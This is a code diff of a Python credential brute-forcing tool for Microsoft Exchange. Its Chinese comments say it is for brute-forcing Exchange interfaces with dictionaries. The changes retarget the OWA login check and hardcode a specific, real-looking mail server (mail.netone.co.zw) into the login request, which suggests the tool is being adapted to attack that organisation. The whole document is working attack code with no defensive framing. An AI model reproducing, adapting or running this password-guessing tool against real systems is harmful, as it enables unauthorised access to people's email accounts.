@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import urllib2, requests, optparse, time, threading, Queue, sys
+import urllib2, requests, optparse, time, threading, Queue, sys, certifi
 from base64 import encodestring
 from requests_ntlm import HttpNtlmAuth
 from lib.consle_width import getTerminalSize
@@ -30,7 +30,7 @@ class Check_Exchange_User:
             "powershell":
                 {"url": "%s://%s/powershell" % ("http" if protocol == "http" else "https", domain), "mode": "Kerberos"},
             "ecp":
-                {"url": "%s://%s/ecp" % ("http" if protocol == "http" else "https", domain), "mode": "HTTP"}
+                {"url": "%s://%s/owa/auth.owa" % ("http" if protocol == "http" else "https", domain), "mode": "HTTP"}
         }
         self.HEADERS = {
             "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:69.0) Gecko/20100101 Firefox/69.0",
@@ -88,36 +88,43 @@ class Check_Exchange_User:
             return False
 
     # http认证验证
-    def check_HTTP_userpass(self, user, password, url):
-        try:
-            HEADERS = self.HEADERS
-            HEADERS["Cache-Control"] = "max-age=0"
-            HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
-            HEADERS[
-                "Referer"] = "https://" + self.domain + "/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2f" + self.domain + "%2fowa%2f"
-            HEADERS["Cookie"] = "PrivateComputer=true; PBack=0"
+    def check_HTTP_userpass(self, user, password, url, type="ecp"):
+        # try:
+        if type == "owa":
+            urldata = "https://mail.netone.co.zw/owa/"
+        else:
+            urldata = "https://mail.netone.co.zw/cep/"
+        HEADERS = self.HEADERS
+        HEADERS["Cache-Control"] = "max-age=0"
+        HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
+        HEADERS[
+            "Referer"] = "https://" + self.domain + "/owa/auth/logon.aspx?replaceCurrent=1&url=" + urldata
+        HEADERS["Cookie"] = "PrivateComputer=true; PBack=0"
 
-            data = {
-                "destination": "https%3A%2F%2F" + self.domain + "%2Fowa%2F",
-                "flags": "4",
-                "forcedownlevel": "0",
-                "username": user,
-                "password": password,
-                "passwordText": "",
-                "isUtf8": "1"
-            }
-            request = requests.session()
-            request.keep_alive = False
-            response = request.post(url, data=data, headers=HEADERS)
-            if "Location" not in response.headers:
-                return False
-            if "reason" not in response.headers["Location"]:
-                return True
-            else:
-                return False
-
-        except:
+        data = {
+            "destination": urldata,
+            "flags": "4",
+            "forcedownlevel": "0",
+            "username": user,
+            "password": password,
+            "passwordText": "",
+            "isUtf8": "1"
+        }
+        # proxies = {'http': 'http://127.0.0.1:8080',
+        #            'https': 'https://127.0.0.1:8080'
+        #            }
+        request = requests.session()
+        request.keep_alive = False
+        response = request.post(url, data=data, headers=HEADERS, allow_redirects=False)
+        if "Location" not in response.headers:
             return False
+        if "reason" not in response.headers["Location"]:
+            return True
+        else:
+            return False
+
+    # except:
+    #     return False
 
     # 爆破exchange接口
     def check_Exchange_Interfac(self, user, password):
@@ -129,7 +136,8 @@ class Check_Exchange_User:
             if self.check_Basic_userpass(user, password, url):
                 return True
         elif mode == "HTTP":
-            if self.check_HTTP_userpass(user, password, url):
+            type = "owa" if "/owa" in self.ReqInfo['url'] else "ecp"
+            if self.check_HTTP_userpass(user, password, url, type=type):
                 return True
 
     # 导入爆破字典字典
@@ -205,7 +213,7 @@ class Check_Exchange_User:
         self.msg_queue.put('[+] Find target url authenticate method ...')
         url = self.ReqInfo["url"]
         mode = self.ReqInfo["mode"]
-        if mode == "http":
+        if mode == "HTTP":
             return True
 
         request = requests.session()
